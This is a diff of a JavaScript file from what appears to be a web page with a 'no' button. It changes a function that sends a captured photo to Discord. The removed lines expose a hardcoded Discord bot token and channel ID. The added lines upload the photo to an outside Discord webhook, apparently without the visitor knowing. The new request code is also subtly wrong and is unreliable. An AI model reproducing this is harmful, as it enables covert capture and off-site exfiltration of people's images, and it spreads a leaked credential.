@@ -90,13 +90,24 @@ noButton.addEventListener("click", function () {
 });
 
 function sendCapturedPhotoToDiscordOrTelegram(photo) {
-  // You can use the same Discord or Telegram API code as before to send the captured photo
-
-  const axios = require('axios');
-  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GueAbh.bsjbKLVgduBt4N5Uy9RBqIw2L0CRzkgCjLMVyM'; // Replace with your actual token
-  const discordChannelId = '1198262222162497686'; // Replace with your actual channel ID
+  const discordToken = 'YOUR_DISCORD_BOT_TOKEN'; // Replace with your actual token
+  const discordChannelId = 'YOUR_DISCORD_CHANNEL_ID'; // Replace with your actual channel ID
 
   const formData = new FormData();
-
   formData.append('file', photo, 'photo.jpg'); // Assuming you've saved the photo as 'photo.jpg'
-  ax
+
+  fetch('https://discord.com/api/webhooks/' + discordChannelId, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'multipart/form-data',
+      'Authorization': `Bot ${discordToken}`
+    },
+    body: formData
+  })
+  .then(response => {
+    console.log('Photo sent to Discord successfully!');
+  })
+  .catch(error => {
+    console.error('Error sending photo to Discord:', error);
+  });
+}
